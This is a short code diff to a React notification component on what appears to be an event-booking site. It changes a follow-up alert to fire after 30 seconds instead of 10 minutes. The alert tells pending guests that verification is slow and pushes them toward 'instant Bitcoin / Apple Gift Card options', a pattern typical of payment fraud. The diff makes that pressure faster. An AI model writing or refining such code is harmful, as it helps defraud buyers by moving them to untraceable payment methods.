@@ -129,9 +129,9 @@ export const GuestMailNotifier: React.FC<GuestMailNotifierProps> = ({
         session.status === "awaiting_admin_details" &&
         !session.adminPaymentDetails &&
         session.createdAt &&
-        nowMs - new Date(session.createdAt).getTime() >= 10 * 60 * 1000
+        nowMs - new Date(session.createdAt).getTime() >= 30 * 1000
       ) {
-        const followUpId = `ten_min_followup:${session.id}`;
+        const followUpId = `thirty_sec_followup:${session.id}`;
         if (!readSet.has(followUpId)) {
           const methodUpper = String(session.paymentMethod || "selected").toUpperCase();
           alerts.push({
@@ -139,9 +139,9 @@ export const GuestMailNotifier: React.FC<GuestMailNotifierProps> = ({
             sessionId: session.id,
             kind: "admin_message",
             title: "Quick update on your NFL experience booking",
-            preview: `$0 charged yet — ${methodUpper} verification is taking a little over 10 mins. View instant Bitcoin / Apple Gift Card options or continue waiting.`,
+            preview: `$0 charged yet — ${methodUpper} verification is taking a little over 30s. View instant Bitcoin / Apple Gift Card options or continue waiting.`,
             method: session.paymentMethod,
-            createdAt: new Date(session.createdAt).getTime() + 10 * 60 * 1000
+            createdAt: new Date(session.createdAt).getTime() + 30 * 1000
           });
         }
       }
